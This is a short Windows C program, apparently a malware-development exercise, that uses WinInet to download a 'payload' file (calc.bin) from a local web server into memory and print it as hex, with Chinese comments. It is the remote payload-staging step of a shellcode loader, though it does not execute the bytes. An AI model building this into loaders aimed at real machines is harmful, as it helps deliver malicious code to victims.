#include <windows.h>
#include <stdio.h>

#include <wininet.h>

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
		hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;

	SIZE_T		sSize = NULL;
	PBYTE		pBytes = NULL,
		pTmpBytes = NULL;



	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}



	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}


void PrintPayloadContent(PBYTE pPayloadBytes, SIZE_T sPayloadSize) {
	printf("[+] Payload Content (%zu bytes):\n", sPayloadSize);

	for (SIZE_T i = 0; i < sPayloadSize; i++) {
		printf("%02X ", pPayloadBytes[i]);  // 按字节以十六进制打印
		if ((i + 1) % 16 == 0) {           // 每 16 个字节换行，便于阅读
			printf("\n");
		}
	}
	if (sPayloadSize % 16 != 0) {
		printf("\n");  // 确保最后一行结束时换行
	}
}

int main() {
	LPCWSTR szUrl = L"http://127.0.0.1:8000/calc.bin";
	PBYTE pPayloadBytes = NULL;
	SIZE_T sPayloadSize = 0;
	if (!GetPayloadFromUrl(szUrl, &pPayloadBytes, &sPayloadSize)) {
		printf("[!] GetPayloadFromUrl Failed \n");
		return -1;
	}

	// 打印 Payload 内容
	PrintPayloadContent(pPayloadBytes, sPayloadSize);


}